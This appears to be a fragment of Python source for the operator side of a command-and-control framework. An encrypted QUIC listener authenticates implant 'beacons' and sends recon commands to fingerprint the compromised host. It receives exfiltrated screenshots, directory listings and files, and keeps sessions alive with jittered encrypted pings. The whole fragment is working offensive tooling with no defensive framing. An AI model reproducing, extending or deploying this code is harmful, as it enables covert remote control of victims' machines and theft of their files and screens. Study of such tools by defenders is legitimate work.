    class EncryptedQUICServer(QuicConnectionProtocol):
        def __init__(self, *args, server_quic=None, update_output_text=None, add_session=None, host="Unknown", port="Unknown", running_server_instances=None, session_table=None, active_sessions=None, chacha=None,id_list =None,base64_img_windows =None ,base64_img_linux =None,save_screenshot_window =None,open_file_browse_window=None,save_file_from_browse=None,exfiltration_profile = None, **kwargs):
            super().__init__(*args, **kwargs)
            self.client_id = str(uuid.uuid4())
            self.server = server_quic
            self.update_output_text = update_output_text
            self.add_session = add_session
            self.session_table = session_table
            self.port = port
            self.host = host
            self.save_screenshot_window =save_screenshot_window
            self.open_file_browse_window = open_file_browse_window
            self.save_file_from_browse = save_file_from_browse
            self.exfiltration_profile = exfiltration_profile
            self.address = (host, port)
            self.active_sessions = active_sessions
            self.buffers = {}
            self.stage = "init"
            self.is_authenticated = False
            self.session_id = f"QUIC - ChaCha - {self.client_id}"
            self.listener_uuid = id_list 
            self.chacha = chacha  
            self.base64_img_windows = base64_img_windows 
            self.base64_img_linux = base64_img_linux
            self.running_server_instances = running_server_instances
            self.images = {
                "Windows": self.base64_img_windows,
                "Linux": self.base64_img_linux
            }
        def connection_made(self, transport):
            super().connection_made(transport)
        def quic_event_received(self, event):
            if isinstance(event, StreamDataReceived):
                stream_id = event.stream_id
                if stream_id not in self.buffers:
                    self.buffers[stream_id] = b""
                self.buffers[stream_id] += event.data
                if not event.end_stream:
                    return
                try:
                    full_data = self.buffers.pop(stream_id)
                    decrypted_data = self.chacha.decrypt(full_data) 
                    message = decrypted_data.decode(errors="ignore").strip()
                    if self.stage == "init":
                        if not self.server.listener_is_active:
                            self._quic.close(
                                error_code=0x03,
                                reason_phrase="Auth ID expired (timeout)"
                            )
                            return
                        if self.server.session_limiting_enable and self.server.total_accepted_sessions >= self.server.max_sessions_limit:
                            self._quic.close(error_code=0x2, reason_phrase="Maximum sessions limit reached")
                            return
                        if message != self.listener_uuid:
                            self._quic.close(error_code=0x1, reason_phrase="Authentication failed")
                            return
                        self.is_authenticated = True
                        self.stage = "detect_os"
                        if self.server.session_limiting_enable:
                            self.server.total_accepted_sessions += 1
                            self.server.current_active_sessions += 1
                        if self.add_session:
                            try:
                                self.add_session(
                                    self.session_id,
                                    self,
                                    self.address,
                                    protocol_type="ChaChaQUICServer",
                                    exfiltration_profile=self.exfiltration_profile,
                                    encryption_type=self.chacha,
                                    encoding_type=None,
                                    quic_sessions=self.active_sessions
                                )
                                with self.server.lock:
                                    self.active_sessions[self.session_id] = {
                                        "client": self,
                                        "last_seen": time.time(),
                                        "manual_disconnect": False
                                    }
                                    self.server.execution_status[self.session_id] = False
                            except Exception as e:
                                if self.update_output_text:
                                    self.update_output_text(f"[!] Failed to add beacon {self.session_id}: {e}\n")
                        if self.update_output_text:
                            self.update_output_text(f"+-------------------------------------------------------------------------------------------------------------+\n[+] QUIC connection from {self.address}, Beacon ID: {self.client_id}\n+-------------------------------------------------------------------------------------------------------------+\n\n", is_general=True)
                        self._stream_id = self._quic.get_next_available_stream_id()
                        encrypted_data = self.chacha.encrypt(b"uname") 
                        self._quic.send_stream_data(self._stream_id, encrypted_data, end_stream=True)
                        return
                except Exception:
                    return
                if not self.is_authenticated:
                    return
                with self.server.lock:
                    if self.session_id in self.active_sessions:
                        self.active_sessions[self.session_id]["last_seen"] = time.time()
                if message == "pong":
                    with self.server.lock:
                        if self.session_id in self.active_sessions:
                            self.active_sessions[self.session_id]["last_seen"] = time.time()
                    return
                if self.stage == "detect_os":
                    self.os_type = "Linux" if "Linux" in message else "Windows"
                    self.stage = "collect_info"
                    if self.os_type == "Windows":
                        command = (
                            "hostname & powershell -Command $PID & cmd /c echo %os% & "
                            "cmd /c echo %PROCESSOR_ARCHITECTURE% & for /f \"tokens=2 delims=:\" %i in ('ipconfig ^| findstr IPv4') do @echo %i"
                        )
                    else:
                        command = (
                            "hostname && echo $$ && uname -o && uname -m && hostname -I | awk \"{print \\$1}\""
                        )
                    self._stream_id = self._quic.get_next_available_stream_id()
                    encrypted_cmd = self.chacha.encrypt(command.encode('utf-8'))  
                    self._quic.send_stream_data(self._stream_id, encrypted_cmd, end_stream=True)
                    return
                if self.stage == "collect_info":
                    self.handle_collect_info(message)
                    return
                elif self.stage == "done":
                    if message.startswith("screenshot-"):
                        base64_data = message[11:]  
                        if self.save_screenshot_window:
                            self.save_screenshot_window(base64_data, self.session_id)
                        self.stage = "done" 
                        return
                    if message.startswith("browse-data-"):
                        base64_data = message[12:]
                        json_str = base64.b64decode(base64_data).decode('utf-8')
                        dir_data = json.loads(json_str)
                        if dir_data.get("success"):
                            self.open_file_browse_window(dir_data, self.session_id, self.os_type)
                        else:
                            if self.update_output_text:
                                self.update_output_text(f"[-] Error: {dir_data.get('error')}\n\n", is_general=False, session_name=self.session_id)
                        return
                    if message.startswith("file-data:"):
                        parts = message[10:].split('|', 2)
                        if len(parts) == 3:
                            filename, filesize_str, filedata_b64 = parts
                            self.save_file_from_browse(self.session_id, filename, filedata_b64)
                        return
                    if message.startswith("SUCCESS:") or message.startswith("ERROR:"):
                        if "Deleted" in message or "Renamed" in message:
                            if self.session_id in self.server.browse_windows:
                                browse = self.server.browse_windows.get(self.session_id)
                                if browse and browse.window_file_browse:
                                    browse.fetch_directory(browse.current_path)
                        return
                    with self.server.lock:
                        self.server.execution_status[self.session_id] = False
                    if self.update_output_text:
                        self.update_output_text(f"{message}\n\n", session_name=self.session_id)
        def handle_collect_info(self, message):
            lines = message.splitlines()
            try:
                os_info = lines[0] if len(lines) > 0 else "Unknown"
                pid = lines[1] if len(lines) > 1 else "Unknown"
                uname_output = lines[2] if len(lines) > 2 else "Unknown"
                uname_m_output = lines[3] if len(lines) > 3 else "Unknown"
                ark = lines[4] if len(lines) > 4 else "Unknown"
                architecture = f"{uname_output} - {uname_m_output}"
            except:
                os_info = pid = uname_output = uname_m_output = ark = "Unknown"
                architecture = "Unknown"
            check_in_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.os_img = self.images[self.os_type]
            self.session_table.insert("","end", text=f" {architecture}",image=self.os_img,values=(self.session_id, f"{self.address[0]} : {self.address[1]}", "00:00:00", os_info, check_in_time, pid, ark))
            threading.Thread(target=self.server.track_quic_session_time, args=(self.session_id, self.address, pid, ark)).start()
            if self.session_id not in self.running_server_instances:
                self.running_server_instances[self.session_id] = {}
            self.running_server_instances[self.session_id]["original_ips"] = (f"{self.address[0]}:{self.address[1]}", ark)
            self.stage = "done"
    def set_session_executing(self, session_id):
        with self.lock:
            self.execution_status[session_id] = True
    def set_session_idle(self, session_id):
        with self.lock:
            self.execution_status[session_id] = False
    async def keep_alive_ping(self):
        while self.is_running:
            jitter_seconds = random.randint(self.start_jitter, self.end_jitter)
            sleep_fraction = self.Sleep / 1000.0
            total_seconds = jitter_seconds + sleep_fraction
            await asyncio.sleep(total_seconds)
            with self.lock:
                for session_id, session_data in list(self.active_sessions.items()):
                    try:
                        client = session_data["client"]
                        if not getattr(client, "is_authenticated", False):
                            continue
                        stream_id = client._quic.get_next_available_stream_id()
                        encrypted_ping = client.chacha.encrypt(b"ping")  
                        client._quic.send_stream_data(stream_id, encrypted_ping, end_stream=True)
                        client.transmit()
                    except:
                        self.active_sessions.pop(session_id, None)
